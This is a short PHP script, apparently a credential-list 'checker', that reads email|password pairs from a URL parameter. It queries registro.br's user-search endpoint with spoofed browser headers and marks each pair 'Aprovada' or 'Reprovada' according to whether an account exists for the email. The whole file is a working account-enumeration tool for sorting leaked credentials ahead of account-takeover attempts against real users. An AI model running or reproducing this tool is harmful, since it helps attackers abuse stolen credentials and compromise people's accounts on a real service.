<?php
error_reporting(0);
set_time_limit(0);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = addslashes(htmlspecialchars($_GET['lista']));
$separa = explode("|", $lista);

$email = trim($separa[0]);
$senha = trim($separa[1]);

$senha_tamanho = strlen($senha);

if($senha_tamanho < 6){
	echo '<span class="label label-danger">#Reprovada senha curta</span>';
}elseif($senha_tamanho >= 6){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://registro.br/v2/ajax/user/search?em='.$email.'&page=0');
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/registro-br.txt');
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/registro-br.txt');
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
	'accept: application/json, text/plain, */*',
	'Referer: https://registro.br/tecnologia/ferramentas/pesquisa-de-usuario/'
	));
	$data = curl_exec($ch);
	//echo $data;
	if(strpos($data, 'login:user-not-found')){
		echo '<span class="label label-danger">#Reprovada '.$usuario.'|'.$email.'|'.$senha.'</span>';
	}else{
		$usuario = getStr($data, '"handle":"', '"');
		echo '<span class="label label-success">#Aprovada '.$usuario.'|'.$email.'|'.$senha.'</span>';
	}
}
flush();
ob_flush();
?>
